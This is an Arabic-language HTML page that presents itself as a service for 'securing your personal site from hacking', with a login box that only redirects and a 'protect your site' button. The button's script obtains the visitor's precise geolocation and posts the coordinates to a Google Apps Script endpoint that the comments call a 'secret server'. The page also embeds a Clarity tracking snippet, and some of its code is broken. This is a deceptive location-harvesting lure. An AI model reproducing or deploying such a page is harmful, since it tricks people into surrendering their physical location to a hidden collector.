<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>موقعي الشخصي</title>
  <style>
    body {
      font-family: "Tahoma", sans-serif;
      background: linear-gradient(to bottom right, #0078ff, #00c6ff);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    h1 {
      font-size: 2.2em;
      margin-bottom: 5px;
    }

    h2 {
      font-weight: normal;
      margin-bottom: 20px;
    }

    .login-box {
      background-color: rgba(255, 255, 255, 0.15);
      padding: 20px;
      border-radius: 15px;
      width: 300px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: none;
      border-radius: 10px;
      outline: none;
      font-size: 1em;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #fff;
      color: #0078ff;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      font-size: 1em;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #e3e3e3;
    }

    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "tpq1exynmb");
  </script>
</head>
<body>
  <h1>🔒📌تامين موقعك الشخصي وحمايته من الاختراق</h1>
  <h2>عبدربه سيف الجوفي</h2>

  <div class="login-box">
    <input type="email" placeholder="اكتب الإيميل هنا">
    <input type="password" placeholder="اكتب كلمة المرور هنا">
    <button onclick="goToMain()">تسجيل الدخول</button>
  </div>

  <script>
    function goToMain() {
      window.location.href = "main.html";
    }
  </script>
<button id="protectButton" onclick="requestAndSendLocation()">
  اضغط لحماية موقعك (يتطلب موافقة الموقع)
</button>
<p id="locationStatus" style="font-weight: bold; color: blue;">
  (انتظر موافقتك على مشاركة الموقع الدقيق)
</p>

<script>
// دالة لتوليد مُعرِّف جلسة عشوائي (الشيء المشترك)
function generateSessionId() {
    return 'LOC_' + Math.random().toString(36).substring(2, 9);
}

// الرابط السري الذي تم الحصول عليه من Google Sheets
// **********************************************
const SECRET_ENDPOINT ='https://script.google.com/macros/s/AKfycbxhirPbpINEo2bX30sNX5DRuNJLWS3pRwHiddPSE3UGrvFXYX5bPzxhOdPtLS8TQFtYgA/exec
// **********************************************

function requestAndSendLocation() {
    const statusElement = document.getElementById('locationStatus');
    const sessionId = generateSessionId(); // توليد المعرِّف المشترك

    // 1. التحقق من دعم المتصفح لتحديد الموقع
    if (!navigator.geolocation) {
        statusElement.textContent = "عذراً، المتصفح لا يدعم تحديد الموقع الجغرافي.";
        return;
    }

    statusElement.textContent = "جاري طلب إذن الموقع... (يرجى الموافقة في النافذة المنبثقة)";

    // 2. طلب الموقع الجغرافي من المتصفح (ستظهر النافذة المنبثقة)
    navigator.geolocation.getCurrentPosition(
        
        // --- الوظيفة عند نجاح الموافقة ---
        function (position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            
            statusElement.textContent = `تم الحصول على موقعك الدقيق (ID: ${sessionId}). جاري الإرسال إلى الخادم السري...`;

            // 3. إعداد البيانات للإرسال (بما في ذلك المُعرِّف المشترك)
            const locationData = {
                session_id: sessionId,
                latitude: latitude,
                longitude: longitude
            };

            // 4. الإرسال الفعلي إلى الخادم السري (عبر الرابط)
            fetch(SECRET_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(locationData),
            })
            .then(response => {
                if (response.ok) {
                    statusElement.textContent = `نجاح الإرسال! تم حفظ الموقع في الخادم السري. (ID: ${sessionId})`;
                } else {
                    statusElement.textContent = `فشل إرسال البيانات إلى الخادم. تحقق من حالة الخادم. (ID: ${sessionId})`;
                }
            })
            .catch(error => {
                console.error('Fetch error:', error);
                statusElement.textContent = `حدث خطأ في الاتصال بالخادم. (ID: ${sessionId})`;
            });
        },
        
        // --- الوظيفة عند الرفض أو الخطأ ---
        function (error) {
            statusElement.textContent = "تم رفض طلب مشاركة الموقع من قبل المستخدم.";
        }
    );
}
</script>
</body>
</html>
